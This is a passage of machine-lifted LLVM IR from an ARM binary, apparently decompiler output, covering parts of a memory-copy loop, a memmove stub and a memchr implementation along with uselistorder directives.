  %v0_14f40 = load i32, i32* %r1.global-to-local, align 4
  %v1_14f40 = add i32 %v0_14f40, -4
  %v2_14f40 = inttoptr i32 %v1_14f40 to i32*
  %v3_14f40 = load i32, i32* %v2_14f40, align 4
  store i32 %v3_14f40, i32* %r3.global-to-local, align 4
  store i32 %v1_14f40, i32* %r1.global-to-local, align 4
  %v4_14f44 = udiv i32 %v3_14f40, 65536
  %v5_14f44 = or i32 %v4_14f44, %v3_14f3c
  store i32 %v5_14f44, i32* @ip, align 4
  %v2_14f48 = add i32 %v1_14f48, -4
  %v3_14f48 = inttoptr i32 %v2_14f48 to i32*
  store i32 %v5_14f44, i32* %v3_14f48, align 4
  %v4_14f48 = load i32, i32* %r0.global-to-local, align 4
  %v5_14f48 = add i32 %v4_14f48, -4
  store i32 %v5_14f48, i32* %r0.global-to-local, align 4
  %v0_14f4c = load i32, i32* %r2.global-to-local, align 4
  %v2_14f4c = add i32 %v0_14f4c, -4
  store i32 %v2_14f4c, i32* %r2.global-to-local, align 4
  %v6_14f50 = icmp slt i32 %v0_14f4c, 4
  br i1 %v6_14f50, label %dec_label_pc_14f54.loopexit, label %dec_label_pc_14f3c

dec_label_pc_14f54.loopexit:                      ; preds = %dec_label_pc_14f3c
  %v4_14f4c = sub i32 3, %v0_14f4c
  %v5_14f4c = and i32 %v4_14f4c, %v0_14f4c
  %v6_14f4c = icmp slt i32 %v5_14f4c, 0
  %v7_14f4c = icmp slt i32 %v2_14f4c, 0
  store i1 %v6_14f4c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14f4c, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14f54

dec_label_pc_14f54:                               ; preds = %dec_label_pc_14f54.loopexit, %dec_label_pc_14f30
  %v2_14e2c64 = phi i32 [ %v5_14f48, %dec_label_pc_14f54.loopexit ], [ %v1_14f24, %dec_label_pc_14f30 ]
  %v0_14e1c60 = phi i32 [ %v2_14f4c, %dec_label_pc_14f54.loopexit ], [ %v2_14f34, %dec_label_pc_14f30 ]
  %v0_14f54 = load i32, i32* %r1.global-to-local, align 4
  %v1_14f54 = add i32 %v0_14f54, 2
  store i32 %v1_14f54, i32* @r1, align 4
  br label %bb143

dec_label_pc_14f5c:                               ; preds = %dec_label_pc_14e70
  br i1 %v5_14f60, label %dec_label_pc_14fa8, label %dec_label_pc_14f64

dec_label_pc_14f64:                               ; preds = %dec_label_pc_14f5c
  store i32 %v2_14f5c, i32* %r2.global-to-local, align 4
  %v3_14f68 = load i32, i32* @r4, align 4
  store i32 %v3_14f68, i32* %stack_var_-12, align 4
  %v6_14f68 = load i32, i32* @r5, align 4
  %v8_14f68 = inttoptr i32 %v6_14f68 to i8*
  store i8* %v8_14f68, i8** %stack_var_-8, align 4
  %v11_14f68 = load i32, i32* @lr, align 4
  br label %dec_label_pc_14f6c

dec_label_pc_14f6c:                               ; preds = %dec_label_pc_14f6c.dec_label_pc_14f6c_crit_edge, %dec_label_pc_14f64
  %v0_14f90 = phi i32 [ %v1_14f90, %dec_label_pc_14f6c.dec_label_pc_14f6c_crit_edge ], [ %v0_14eb831, %dec_label_pc_14f64 ]
  %v0_14f70 = phi i32 [ %v0_14f70.pre, %dec_label_pc_14f6c.dec_label_pc_14f6c_crit_edge ], [ %v1_14e70, %dec_label_pc_14f64 ]
  %v0_14f6c = phi i32 [ %v0_14f6c.pre, %dec_label_pc_14f6c.dec_label_pc_14f6c_crit_edge ], [ %v2_14e74, %dec_label_pc_14f64 ]
  %v3_14f6c = mul i32 %v0_14f6c, 16777216
  store i32 %v3_14f6c, i32* %lr.global-to-local, align 4
  %v1_14f70 = add i32 %v0_14f70, -4
  %v2_14f70 = inttoptr i32 %v1_14f70 to i32*
  %v3_14f70 = load i32, i32* %v2_14f70, align 4
  store i32 %v3_14f70, i32* %r3.global-to-local, align 4
  %v4_14f70 = add i32 %v0_14f70, -8
  %v5_14f70 = inttoptr i32 %v4_14f70 to i32*
  %v6_14f70 = load i32, i32* %v5_14f70, align 4
  store i32 %v6_14f70, i32* %r4.global-to-local, align 4
  %v7_14f70 = add i32 %v0_14f70, -12
  %v8_14f70 = inttoptr i32 %v7_14f70 to i32*
  %v9_14f70 = load i32, i32* %v8_14f70, align 4
  store i32 %v9_14f70, i32* %r5.global-to-local, align 4
  %v10_14f70 = add i32 %v0_14f70, -16
  %v11_14f70 = inttoptr i32 %v10_14f70 to i32*
  %v12_14f70 = load i32, i32* %v11_14f70, align 4
  store i32 %v10_14f70, i32* %r1.global-to-local, align 4
  %v4_14f74 = udiv i32 %v12_14f70, 256
  %v5_14f74 = or i32 %v4_14f74, %v3_14f6c
  store i32 %v5_14f74, i32* %lr.global-to-local, align 4
  %v3_14f78 = mul i32 %v12_14f70, 16777216
  %v4_14f7c = udiv i32 %v9_14f70, 256
  %v5_14f7c = or i32 %v3_14f78, %v4_14f7c
  store i32 %v5_14f7c, i32* @ip, align 4
  %v3_14f80 = mul i32 %v9_14f70, 16777216
  %v4_14f84 = udiv i32 %v6_14f70, 256
  %v5_14f84 = or i32 %v3_14f80, %v4_14f84
  store i32 %v5_14f84, i32* %r5.global-to-local, align 4
  %v3_14f88 = mul i32 %v6_14f70, 16777216
  %v4_14f8c = udiv i32 %v3_14f70, 256
  %v5_14f8c = or i32 %v3_14f88, %v4_14f8c
  store i32 %v5_14f8c, i32* %r4.global-to-local, align 4
  %v1_14f90 = add i32 %v0_14f90, -16
  %v2_14f90 = inttoptr i32 %v1_14f90 to i32*
  store i32 %v5_14f8c, i32* %v2_14f90, align 4
  %v4_14f90 = add i32 %v0_14f90, -12
  %v5_14f90 = inttoptr i32 %v4_14f90 to i32*
  %v6_14f90 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_14f90, i32* %v5_14f90, align 4
  %v7_14f90 = add i32 %v0_14f90, -8
  %v8_14f90 = inttoptr i32 %v7_14f90 to i32*
  %v9_14f90 = load i32, i32* @ip, align 4
  store i32 %v9_14f90, i32* %v8_14f90, align 4
  %v10_14f90 = add i32 %v0_14f90, -4
  %v11_14f90 = inttoptr i32 %v10_14f90 to i32*
  %v12_14f90 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14f90, i32* %v11_14f90, align 4
  store i32 %v1_14f90, i32* %r0.global-to-local, align 4
  %v0_14f94 = load i32, i32* %r2.global-to-local, align 4
  %v2_14f94 = add i32 %v0_14f94, -16
  store i32 %v2_14f94, i32* %r2.global-to-local, align 4
  %v6_14f98 = icmp slt i32 %v0_14f94, 16
  br i1 %v6_14f98, label %dec_label_pc_14f9c, label %dec_label_pc_14f6c.dec_label_pc_14f6c_crit_edge

dec_label_pc_14f6c.dec_label_pc_14f6c_crit_edge:  ; preds = %dec_label_pc_14f6c
  %v0_14f6c.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_14f70.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14f6c

dec_label_pc_14f9c:                               ; preds = %dec_label_pc_14f6c
  %v2_14f9c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14f9c, i32* @r4, align 4
  %v5_14f9c = load i8*, i8** %stack_var_-8, align 4
  %v6_14f9c = ptrtoint i8* %v5_14f9c to i32
  store i32 %v6_14f9c, i32* @r5, align 4
  store i32 %v11_14f68, i32* @lr, align 4
  %v2_14fa0 = add i32 %v0_14f94, -4
  store i32 %v2_14fa0, i32* %r2.global-to-local, align 4
  %v4_14fa0 = add i32 %v0_14f94, 2147483632
  %v5_14fa0 = and i32 %v2_14fa0, %v4_14fa0
  %v6_14fa0 = icmp slt i32 %v5_14fa0, 0
  store i1 %v6_14fa0, i1* %cpsr_v.global-to-local, align 1
  %v7_14fa0 = icmp slt i32 %v2_14fa0, 0
  store i1 %v7_14fa0, i1* %cpsr_n.global-to-local, align 1
  %v5_14fa4 = icmp slt i32 %v2_14f94, -12
  br i1 %v5_14fa4, label %dec_label_pc_14fc0, label %dec_label_pc_14fa8

dec_label_pc_14fa8:                               ; preds = %dec_label_pc_14f9c, %dec_label_pc_14f5c, %dec_label_pc_14fa8
  %v1_14fb4 = phi i32 [ %v5_14fb4, %dec_label_pc_14fa8 ], [ %v1_14f90, %dec_label_pc_14f9c ], [ %v0_14eb831, %dec_label_pc_14f5c ]
  %v0_14fa8 = load i32, i32* %r3.global-to-local, align 4
  %v3_14fa8 = mul i32 %v0_14fa8, 16777216
  store i32 %v3_14fa8, i32* %ip.global-to-local, align 4
  %v0_14fac = load i32, i32* %r1.global-to-local, align 4
  %v1_14fac = add i32 %v0_14fac, -4
  %v2_14fac = inttoptr i32 %v1_14fac to i32*
  %v3_14fac = load i32, i32* %v2_14fac, align 4
  store i32 %v3_14fac, i32* %r3.global-to-local, align 4
  store i32 %v1_14fac, i32* %r1.global-to-local, align 4
  %v4_14fb0 = udiv i32 %v3_14fac, 256
  %v5_14fb0 = or i32 %v4_14fb0, %v3_14fa8
  store i32 %v5_14fb0, i32* @ip, align 4
  %v2_14fb4 = add i32 %v1_14fb4, -4
  %v3_14fb4 = inttoptr i32 %v2_14fb4 to i32*
  store i32 %v5_14fb0, i32* %v3_14fb4, align 4
  %v4_14fb4 = load i32, i32* %r0.global-to-local, align 4
  %v5_14fb4 = add i32 %v4_14fb4, -4
  store i32 %v5_14fb4, i32* %r0.global-to-local, align 4
  %v0_14fb8 = load i32, i32* %r2.global-to-local, align 4
  %v2_14fb8 = add i32 %v0_14fb8, -4
  store i32 %v2_14fb8, i32* %r2.global-to-local, align 4
  %v6_14fbc = icmp slt i32 %v0_14fb8, 4
  br i1 %v6_14fbc, label %dec_label_pc_14fc0.loopexit, label %dec_label_pc_14fa8

dec_label_pc_14fc0.loopexit:                      ; preds = %dec_label_pc_14fa8
  %v4_14fb8 = sub i32 3, %v0_14fb8
  %v5_14fb8 = and i32 %v4_14fb8, %v0_14fb8
  %v6_14fb8 = icmp slt i32 %v5_14fb8, 0
  %v7_14fb8 = icmp slt i32 %v2_14fb8, 0
  store i1 %v6_14fb8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14fb8, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14fc0

dec_label_pc_14fc0:                               ; preds = %dec_label_pc_14fc0.loopexit, %dec_label_pc_14f9c
  %v2_14e2c65 = phi i32 [ %v5_14fb4, %dec_label_pc_14fc0.loopexit ], [ %v1_14f90, %dec_label_pc_14f9c ]
  %v0_14e1c61 = phi i32 [ %v2_14fb8, %dec_label_pc_14fc0.loopexit ], [ %v2_14fa0, %dec_label_pc_14f9c ]
  %v0_14fc0 = load i32, i32* %r1.global-to-local, align 4
  %v1_14fc0 = add i32 %v0_14fc0, 1
  store i32 %v1_14fc0, i32* @r1, align 4
  br label %bb143

; uselistorder directives
  uselistorder i32 %v5_14fb4, { 0, 2, 1 }
  uselistorder i32 %v3_14fa8, { 1, 0 }
  uselistorder i32 %v2_14fa0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_14f90, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_14f70, { 1, 0 }
  uselistorder i32 %v3_14f6c, { 1, 0 }
  uselistorder i32 %v0_14f70, { 3, 2, 1, 0 }
  uselistorder i32 %v0_14f90, { 3, 2, 1, 0 }
  uselistorder i32 %v5_14f48, { 0, 2, 1 }
  uselistorder i32 %v3_14f3c, { 1, 0 }
  uselistorder i32 %v2_14f34, { 0, 2, 1, 3 }
  uselistorder i32 %v1_14f24, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_14f04, { 1, 0 }
  uselistorder i32 %v3_14f00, { 1, 0 }
  uselistorder i32 %v0_14f04, { 3, 2, 1, 0 }
  uselistorder i32 %v0_14f24, { 3, 2, 1, 0 }
  uselistorder i32 %v5_14edc, { 0, 2, 1 }
  uselistorder i32 %v3_14ed0, { 1, 0 }
  uselistorder i32 %v2_14ec8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_14eb8, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_14e98, { 1, 0 }
  uselistorder i32 %v3_14e94, { 1, 0 }
  uselistorder i32 %v0_14e98, { 3, 2, 1, 0 }
  uselistorder i32 %v0_14eb8, { 3, 2, 1, 0 }
  uselistorder i1 %v5_14f60, { 2, 0, 1 }
  uselistorder i32 %v0_14e78, { 1, 0 }
  uselistorder i32 %v0_14f64, { 3, 0, 2, 1 }
  uselistorder i32 %v0_14eb831, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_14e68, { 2, 1, 0 }
  uselistorder i32 %v0_14e68, { 2, 0, 1 }
  uselistorder i32 %v2_14e60, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_14e60, { 1, 0, 2 }
  uselistorder i32 %v0_14e60, { 2, 0, 1, 3 }
  uselistorder i32 %v0_14eb832, { 2, 1, 0 }
  uselistorder i32 %v11_14e3c, { 1, 0 }
  uselistorder i32 %v7_14e3c, { 1, 0 }
  uselistorder i32 %v1_14e1c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_14e1c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_14e20, { 1, 0 }
  uselistorder i32 %v7_14e14, { 0, 2, 1 }
  uselistorder i32 %v10_14e10, { 1, 0 }
  uselistorder i32 %v9_14e08, { 1, 0, 2 }
  uselistorder i32 %v6_14e04, { 1, 0 }
  uselistorder i32 %v2_14dfc, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_14dfc, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_14e0c, { 0, 3, 2, 1 }
  uselistorder i32 %v7_14df0, { 0, 2, 1 }
  uselistorder i32 %v13_14dec, { 1, 0 }
  uselistorder i32 %v4_14de8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_14de8, { 2, 0, 1 }
  uselistorder i32 %v6_14df0, { 0, 3, 2, 1 }
  uselistorder i32 %v7_14de0, { 0, 2, 1 }
  uselistorder i32 %v16_14ddc, { 1, 0 }
  uselistorder i32 %v4_14dd8, { 1, 0 }
  uselistorder i32 %v0_14de8.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_14de0, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_14dcc, { 0, 3, 2, 1 }
  uselistorder i32 %v10_14dc8, { 1, 0 }
  uselistorder i32 %v1_14dc4, { 1, 0 }
  uselistorder i32 %v10_14dc0, { 1, 0 }
  uselistorder i32 %v0_14dc0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_14dc4, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_14db8, { 0, 2, 1 }
  uselistorder i32 %v2_14dac, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_14dac, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v0_14dc449, { 1, 2, 0 }
  uselistorder i32 %v1_14da4, { 2, 1, 0 }
  uselistorder i32 %v1_14d9c, { 2, 3, 1, 0 }
  uselistorder i32 %v2_14d94, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_14d90, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_14d8c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_14d8c, { 3, 0, 5, 4, 1, 2 }
  uselistorder i32 %v4_14d78, { 0, 2, 1 }
  uselistorder i32 %v3_14d6c, { 1, 0 }
  uselistorder i32 %v2_14d64, { 0, 2, 1, 3 }
  uselistorder i32 %v12_14d54, { 1, 0, 3, 2 }
  uselistorder i32 %v8_14d34, { 1, 0, 2 }
  uselistorder i32 %v5_14d34, { 1, 0, 2 }
  uselistorder i32 %v2_14d34, { 1, 0, 2 }
  uselistorder i32 %v3_14d30, { 1, 0 }
  uselistorder i32 %v0_14d34, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_14d54, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_14d0c, { 0, 2, 1 }
  uselistorder i32 %v3_14d00, { 1, 0 }
  uselistorder i32 %v2_14cf8, { 0, 2, 1, 3 }
  uselistorder i32 %v12_14ce8, { 1, 0, 3, 2 }
  uselistorder i32 %v8_14cc8, { 1, 0, 2 }
  uselistorder i32 %v5_14cc8, { 1, 0, 2 }
  uselistorder i32 %v2_14cc8, { 1, 0, 2 }
  uselistorder i32 %v3_14cc4, { 1, 0 }
  uselistorder i32 %v0_14cc8, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_14ce8, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_14ca0, { 0, 2, 1 }
  uselistorder i32 %v3_14c94, { 1, 0 }
  uselistorder i32 %v2_14c8c, { 0, 2, 1, 3 }
  uselistorder i32 %v12_14c7c, { 1, 0, 3, 2 }
  uselistorder i32 %v8_14c5c, { 1, 0, 2 }
  uselistorder i32 %v5_14c5c, { 1, 0, 2 }
  uselistorder i32 %v2_14c5c, { 1, 0, 2 }
  uselistorder i32 %v3_14c58, { 1, 0 }
  uselistorder i32 %v0_14c5c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_14c7c, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v5_14d24, { 2, 0, 1 }
  uselistorder i32 %v0_14d28, { 3, 0, 2, 1 }
  uselistorder i32 %v0_14c7c75, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_14c2c, { 1, 0 }
  uselistorder i32 %v0_14c2c, { 3, 1, 0, 2 }
  uselistorder i32 %v2_14c24, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_14c24, { 1, 0, 2 }
  uselistorder i32 %v0_14c24, { 2, 0, 1, 3 }
  uselistorder i32 %v0_14c7c76, { 2, 1, 0 }
  uselistorder i32 %v1_14c04, { 1, 0, 2 }
  uselistorder i32 %v1_14bdc, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_14bdc, { 1, 2, 0, 3 }
  uselistorder i32 %v8_14bc8, { 1, 0, 2 }
  uselistorder i32 %v6_14bc4, { 1, 0 }
  uselistorder i32 %v2_14bbc, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_14bbc, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_14bcc, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v4_14bb4, { 0, 2, 1 }
  uselistorder i1 %v0_14bb4, { 1, 0 }
  uselistorder i1 %v1_14bb4, { 1, 0 }
  uselistorder i32 %v3_14bb0, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_14ba8, { 0, 2, 1, 3 }
  uselistorder i32 %v4_14b94, { 1, 0 }
  uselistorder i32 %v12_14b88, { 0, 1, 3, 2 }
  uselistorder i32 %v0_14b7c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_14b80, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v2_14b70, { 0, 2, 1 }
  uselistorder i32 %v2_14b68, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_14b68, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v1_14b60, { 1, 0 }
  uselistorder i32 %v1_14b58, { 2, 1, 0 }
  uselistorder i32 %v2_14b50, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_14b50, { 1, 0, 2, 3 }
  uselistorder i32 %v2_14b40, { 1, 0 }
  uselistorder i32 %v1_14b40, { 1, 5, 3, 4, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_14b40, { 1, 7, 9, 8, 6, 4, 0, 5, 11, 2, 3, 10, 12 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 15, 16, 17, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 24, 25, 26, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r3.global-to-local, { 0, 9, 1, 2, 3, 10, 4, 5, 6, 11, 7, 8, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 39, 40, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder i32* %r2.global-to-local, { 0, 30, 1, 2, 3, 4, 5, 31, 6, 7, 8, 9, 10, 32, 11, 12, 13, 14, 15, 33, 16, 18, 17, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 34, 64, 65, 66, 67, 68, 69, 35, 60, 36, 37, 38, 39, 40, 61, 41, 42, 43, 44, 45, 62, 46, 48, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 63 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 12, 1, 3, 6, 4, 13, 5, 7, 10, 8, 14, 9, 11, 15, 16, 17, 34, 32, 35, 33, 36, 20, 18, 26, 19, 21, 24, 22, 27, 23, 25, 28, 29, 30, 31 }
  uselistorder i32* %r0.global-to-local, { 3, 25, 4, 5, 26, 6, 7, 27, 8, 9, 10, 11, 12, 13, 28, 14, 16, 15, 17, 18, 29, 19, 20, 30, 21, 22, 23, 24, 31, 57, 59, 60, 32, 39, 33, 34, 40, 35, 36, 37, 38, 41, 42, 0, 43, 44, 46, 45, 47, 48, 58, 49, 50, 51, 54, 52, 53, 55, 56, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 12, 13, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i1* %cpsr_v.global-to-local, { 5, 7, 4, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 1, 41, 0, 24, 2, 25, 42, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 1, 47, 0, 27, 2, 28, 48, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 -12, { 1, 13, 14, 2, 16, 17, 3, 18, 19, 15, 12, 11, 10, 9, 8, 20, 21, 22, 4, 5, 6, 23, 7, 24, 25, 27, 28, 29, 26, 0 }
  uselistorder i32 -16, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 2, 0, 22 }
  uselistorder i32 27, { 1, 0 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -8, { 13, 14, 15, 16, 17, 18, 12, 11, 5, 10, 9, 8, 7, 19, 20, 21, 22, 6, 23, 24, 3, 0, 28, 25, 26, 27, 2, 29, 30, 4, 1 }
  uselistorder label %dec_label_pc_14fa8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14f3c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14ed0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14e70, { 1, 0 }
  uselistorder label %.thread26, { 2, 0, 1 }
  uselistorder label %.thread122, { 1, 0 }
  uselistorder label %bb143, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_14dfc, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_14dc0, { 1, 0 }
  uselistorder label %dec_label_pc_14dac, { 1, 0 }
  uselistorder label %dec_label_pc_14d6c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14d00, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14c94, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14c34, { 1, 0 }
  uselistorder label %.thread12, { 2, 0, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %bb133, { 4, 6, 5, 1, 7, 0, 2, 3 }
  uselistorder label %.thread118, { 1, 0 }
  uselistorder label %dec_label_pc_14ba8, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_14b68, { 1, 0 }
}

define i32 @function_14fc8(i32 %arg1) local_unnamed_addr {
dec_label_pc_14fc8:
  ret i32 %arg1
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_14fd0 = load i32, i32* @r0, align 4
  %v1_14fd0 = load i32, i32* @r1, align 4
  %v2_14fd0 = inttoptr i32 %v0_14fd0 to i8*
  %v3_14fd0 = call i32 @_memcpy(i8* %v2_14fd0, i32 %v1_14fd0)
  ret i32 %v3_14fd0

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 0, 2, 1 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_14fe0 = load i32, i32* @r4, align 4
  %v6_14fe0 = load i32, i32* @r5, align 4
  %v9_14fe0 = load i32, i32* @r6, align 4
  %v1_14fe4 = urem i32 %arg1, 256
  %v0_1500018 = load i32, i32* @r2, align 4
  %v2_1500020 = icmp eq i32 %v0_1500018, 0
  br i1 %v2_1500020, label %dec_label_pc_15010, label %dec_label_pc_15008

dec_label_pc_14fec:                               ; preds = %dec_label_pc_15008
  %v3_14fec = load i8, i8* %.021, align 1
  %v4_14fec = zext i8 %v3_14fec to i32
  %v9_14ff0 = icmp eq i32 %v4_14fec, %v1_14fe4
  %v1_14ff4 = add i32 %v0_14ff4, -1
  br i1 %v9_14ff0, label %bb, label %dec_label_pc_15000

bb:                                               ; preds = %dec_label_pc_14fec
  ret i32 %v1_15008

dec_label_pc_15000:                               ; preds = %dec_label_pc_14fec
  %v2_14ffc = add i32 %v1_15008, 1
  %v3_14ffc = inttoptr i32 %v2_14ffc to i8*
  %v2_15000 = icmp eq i32 %v1_14ff4, 0
  br i1 %v2_15000, label %dec_label_pc_15010, label %dec_label_pc_15008

dec_label_pc_15008:                               ; preds = %entry, %dec_label_pc_15000
  %v0_14ff4 = phi i32 [ %v1_14ff4, %dec_label_pc_15000 ], [ %v0_1500018, %entry ]
  %.021 = phi i8* [ %v3_14ffc, %dec_label_pc_15000 ], [ undef, %entry ]
  %v1_15008 = ptrtoint i8* %.021 to i32
  %v2_15008 = urem i32 %v1_15008, 4
  %v3_15008 = icmp eq i32 %v2_15008, 0
  br i1 %v3_15008, label %dec_label_pc_15010, label %dec_label_pc_14fec

dec_label_pc_15010:                               ; preds = %dec_label_pc_15000, %dec_label_pc_15008, %entry
  %v0_1509c37 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_15000 ], [ %v0_14ff4, %dec_label_pc_15008 ]
  %.0.lcssa = phi i8* [ undef, %entry ], [ %v3_14ffc, %dec_label_pc_15000 ], [ %.021, %dec_label_pc_15008 ]
  %v4_15010 = mul nuw nsw i32 %v1_14fe4, 256
  %v5_15010 = or i32 %v4_15010, %v1_14fe4
  %v1_15014 = ptrtoint i8* %.0.lcssa to i32
  store i32 %v1_15014, i32* @ip, align 4
  %v4_15018 = mul i32 %v5_15010, 65536
  %v5_15018 = or i32 %v4_15018, %v5_15010
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_1509c37, 3
  br i1 %tmp, label %dec_label_pc_15020, label %dec_label_pc_150c4.preheader

dec_label_pc_15020:                               ; preds = %dec_label_pc_15010, %dec_label_pc_1509c.backedge
  %v0_1503c82 = phi i32 [ %v1_1503c, %dec_label_pc_1509c.backedge ], [ %v0_1509c37, %dec_label_pc_15010 ]
  %v0_1502081 = phi i32 [ %v4_15020, %dec_label_pc_1509c.backedge ], [ %v1_15014, %dec_label_pc_15010 ]
  %v1_15020 = inttoptr i32 %v0_1502081 to i32*
  %v2_15020 = load i32, i32* %v1_15020, align 4
  %v4_15020 = add i32 %v0_1502081, 4
  store i32 %v4_15020, i32* @ip, align 4
  %v2_15024 = xor i32 %v2_15020, %v5_15018
  %v2_15028 = add i32 %v2_15024, 2130640639
  %v1_1502c = sub i32 -1, %v2_15024
  %v2_15030 = xor i32 %v2_15028, %v1_1502c
  %v2_15034 = and i32 %v2_15030, -2130640640
  %v2_15038 = icmp eq i32 %v2_15034, 0
  %v1_1503c = add i32 %v0_1503c82, -4
  br i1 %v2_15038, label %dec_label_pc_1509c.backedge, label %dec_label_pc_15044

dec_label_pc_1509c.backedge:                      ; preds = %dec_label_pc_15020, %dec_label_pc_15088
  store i32 -2130640640, i32* @lr, align 4
  %tmp107 = icmp ugt i32 %v1_1503c, 3
  br i1 %tmp107, label %dec_label_pc_15020, label %dec_label_pc_150c4.preheader

dec_label_pc_15044:                               ; preds = %dec_label_pc_15020
  %v2_15044 = inttoptr i32 %v0_1502081 to i8*
  %v3_15044 = load i8, i8* %v2_15044, align 1
  %v4_15044 = zext i8 %v3_15044 to i32
  %v9_1504c = icmp eq i32 %v4_15044, %v1_14fe4
  %v1_15050 = add i32 %v0_1502081, 3
  %v1_15054 = add i32 %v0_1502081, 1
  store i32 %v1_15054, i32* @lr, align 4
  %v1_15058 = add i32 %v0_1502081, 2
  br i1 %v9_1504c, label %bb50, label %bb51

bb50:                                             ; preds = %dec_label_pc_15044
  store i32 %v3_14fe0, i32* @r4, align 4
  store i32 %v6_14fe0, i32* @r5, align 4
  store i32 %v9_14fe0, i32* @r6, align 4
  ret i32 %v0_1502081

bb51:                                             ; preds = %dec_label_pc_15044
  %v2_15060 = inttoptr i32 %v1_15054 to i8*
  %v3_15060 = load i8, i8* %v2_15060, align 1
